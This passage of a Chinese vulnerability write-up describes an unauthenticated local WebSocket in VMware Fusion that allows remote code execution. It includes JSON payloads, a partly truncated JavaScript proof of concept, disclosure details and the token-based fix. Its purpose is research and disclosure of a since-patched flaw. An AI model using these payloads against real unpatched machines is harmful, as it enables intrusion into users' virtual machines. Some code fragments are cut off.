这些都可以通过Websocket来调用。我没有具体探索菜单的每一个选项，如果攻击者知道vmUUID，可以（利用它）做任何事情（制作快照，开启VM，删除VM等）。问题是，我仍没有弄清楚如何获取它。
下面一个有趣的选项是`menu.refresh`。使用以下Payload：
    const payload = {
            "name":"menu.refresh",
                };
可以获取VM的信息以及已安装App的一些信息。
    {
      "key": "menu.update",
      "value": {
        "vmList": [
          {
            "name": "Kali 2018 Master (2018Q4)",
            "cachePath": "/Users/csaby/VM/Kali 2018 Master (2018Q4).vmwarevm/startMenu.plist"
          },
          {
            "name": "macOS 10.14",
            "cachePath": "/Users/csaby/VM/macOS 10.14.vmwarevm/startMenu.plist"
          },
          {
            "name": "Windows 10 x64",
            "cachePath": "/Users/csaby/VM/Windows 10 x64.vmwarevm/startMenu.plist"
          }
        ],
        "menu": {
          "pinnedApps": [],
          "frequentlyUsedApps": [
            {
              "rawIcons": [
                {
    (...)
通过前面讨论的API，我们可以看到这里也有信息泄露接口。
#### Websocket RCE 无需vmUUID
另一个有趣的地方是`menu.selectIndex`，用户通过它选择VM。这个功能的原始代码可以在`app.asar`直接找到，我们可以通过阅读摸清楚调用流程：
    // Called when VM selection changed
       selectIndex(index: number) {
          log.info('Renderer#ActionService::selectIndex: (index:', index, ')');
          if (this.checkIsFusionUIRunning()) {
             this.send({
                name: 'menu.selectIndex',
                userInfo: { selectedIndex: index }
             });
          }
我们可以选择某个VM guest运行App来调用`menu.selectIndex`：
    const payload = {
            "name":"menu.selectIndex",
            "userInfo": {
                "selectedIndex":"3"
                    }
                };
然后我研究是否可以在`menu.onAction`调用中使用`selectedIndex`目录，结果为可以。同时，通过`menu.refresh`返回的vmlist中每台VM都有正确的索引和顺序。
想要获取完整RCE权限：
  1. 通过`menu.refresh`泄露出VM列表。
  2. 通过索引在guest账户上运行一个App。
Poc：
    ws = new WebSocket("ws://127.0.0.1:8698/ws");
    ws.onopen = function() {
        //payload to show vm names and cache path
        const payload = {
            "name":"menu.refresh",
                };
                ws.send(JSON.stringify(payload));           
            };
    ws.onmessage = function(data) {
        //document.write(data.data);
        console.log(JSON.parse(data.data));
        var j_son = JSON.parse(data.data);
        var vmlist = j_son.value.vmList;
        var i;
        for (i = 0; i 
### 漏洞上报
报告这个漏洞之前我咨询@Codecolorist是否由他来上报给VMware，他回答可以，之后VMware团队与他进行沟通。我决定向VMware团队提交另一份报告，该报告中的漏洞更加严重，我想敦促它们尽快修复它，我提交的漏洞的Poc与本文相比使用了一种新方法。
#### 修复
VM在几天前发布了补丁，参考：[VMSA-2019-0005](https://www.vmware.com/security/advisories/VMSA-2019-0005.html)。我查看VMware团队做些什么，发现它们加入了token认证，并且在每次启动VM都将刷新token值。
这里是相关的更新代码（文件：`app.asar`）：
    String.prototype.pick = function(min, max) {
       var n,
          chars = '';
       if (typeof max === 'undefined') {
          n = min;
       } else {
          n = min + Math.floor(Math.random() * (max - min + 1));
       }
       for (var i = 0; i ?|[];\',./`~';
          const lowercase = 'abcdefghijklmnopqrstuvwxyz';
          const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
          const numbers = '0123456789';
          const all = specials + lowercase + uppercase + numbers;
          let token = '';
          token += specials.pick(1);
          token += lowercase.pick(1);
          token += uppercase.pick(1);
          token += numbers.pick(1);
          token += all.pick(5, 7);
          token = token.shuffle();
          return Buffer.from(token).toString('base64');
       }
这里的token值为可变长度密码，其中包含从app，小写，数组和符号中提取的至少一个字符。同时，程序会对密钥做Base64编码，我们在Wireshark中可以看到：
我发现了下面这段代码：
    function sendVmrestReady() {
       log.info('Main#sendVmrestReady');
       if (mainWindow) {
          mainWindow.webContents.send('vmrestReady', [
             'ws://localhost:' + global['port'] + '/ws?token=' + token,
             'http://localhost:' + global['port'],
             '?token=' + token
          ]);
       }
如果在目标mac已经获取代码执行，那你就能够获取token值，但是在那种情况下谁还会去做呢。加入密码严重地限制了攻击者利用该漏洞获取远程代码执行的能力。